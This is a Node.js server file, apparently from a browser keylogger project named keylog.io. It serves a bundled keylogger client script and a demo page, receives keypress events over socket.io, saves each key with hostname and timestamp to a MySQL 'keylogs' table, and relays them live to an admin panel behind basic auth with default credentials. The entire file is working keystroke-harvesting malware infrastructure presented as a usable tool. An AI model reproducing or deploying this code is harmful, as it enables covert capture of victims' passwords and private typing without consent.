'use strict';

const { name, version } = require('../package.json');

const http = require('http');
const path = require('path');
const express = require('express');
const mysql = require('mysql');
const moment = require('moment');
const app = express();
const basicAuth = require('express-basic-auth');

// Like object assign but avoid undefined
const assignDefined = (target, ...sources) => {
  for (const source of sources) {
    for (const key of Object.keys(source)) {
      const val = source[key];
      if (val !== undefined) {
        target[key] = val;
      }
    }
  }
  return target;
}

// Server default settings
const defaults = {
  // Database connection options
  database: {
    name: 'keylogger',
    hostname: 'localhost',
    port: 3306,
    username: name,
    password: name,
    debug: false
  },
  // Administrator interface basic auth
  username: name,
  password: name,
  // Service settings
  hostname: 'localhost',
  port: 9000,
  // where to serve the administrator interface
  adminPath: '/',
  // serve a demo keylogger-client page
  serveDemo: false,
  // serve the keylogger client (bundled with socket.io)
  serveClient: false
};

module.exports = function(options) {
  // Init a empty variable for holding optional mysql connection
  let connection = null;

  // Init the http server with express handler
  const server = http.Server(app);

  // Clone original user defined options
  const original = Object.assign({}, options);

  // Extend default options with user supplied
  options = assignDefined({}, defaults, options);

  // Basic HTTé Authorization handler
  const authorizationFunction = basicAuth({
    challenge: true,
    users: { [`${options.username}`]: options.password }
  });

  // Create socket server
  const io = require('socket.io')(server, {
    serveClient: false
  });

  // If user passed database optios originally
  if (original.database) {
    // Create MySQL client
    connection = mysql.createConnection({
      host: options.database.hostname,
      user: options.database.username,
      password: options.database.password,
      database: options.database.name,
      debug: options.database.debug
    });

    // Test MYSQL connection
    connection.query('SELECT 1', function (error, results, fields) {
      if (error) {
        console.log('Error: MYSQL database', error.message);
        console.log('Warning: The keylog messages will not be stored.');
      } else {
        console.log('MySQL connection working successfully');
      }
    });
  }

  // Serve the keylog.io administration panel
  app.get(options.adminPath, authorizationFunction, (req, res) => {
    res.sendFile(path.join(__dirname, '/../dist/index.html'));
  });
  app.use(express.static(path.join(__dirname, '/../dist')));

  // Optionally serve a keylogger-client demo page
  if (options.serveDemo) {
    console.log('Serving keylogger-client DEMO page at:', `${options.hostname}:${options.port}/demo`);

    // Serve demo page
    app.use('/demo', express.static(path.join(__dirname, 'demo')));
  }

  // Serve the keylogger-client through express
  if (options.serveClient) {
    console.log('Serving keylogger-client JS at:', `${options.hostname}:${options.port}/client.min.js`);
    app.get('/client.min.js', function (req, res) {
      res.sendFile(path.join(__dirname, '/dist/bundle.min.js'));
    });
  }

  // Administrator private namespace
  const admin = io.of('/admin');

  // Default namespace for clients
  io.on('connection', function (socket) {
    console.log('A new socket has connected:', socket.id);

    // Listen for keylogs
    socket.on('keypress', (data) => {
      console.debug('A new keylog received from:', data.hostname, 'key pressed:', data.key);

      // Clone object
      let mysqlData = Object.assign({}, data);
      mysqlData.timestamp = moment(data.timestamp).format('YYYY-MM-DD HH:mm:ss')

      // Save the keypress to DB or queue
      if (connection && connection.state !== 'disconnected') {
        connection.query('INSERT INTO keylogs SET ?', mysqlData, function (error, results, fields) {
          if (error) {
            console.log('Error while saving keylog event to database.');
            console.log(error);
          }
        });
      }

      // Emit to channel
      admin.emit('keylog', data);
    });
  });

  // Start express socket server
  server.listen(options.port, options.hostname, () => {
    console.log('Server started and listening on:', `${options.hostname}:${options.port}`);
  });
};
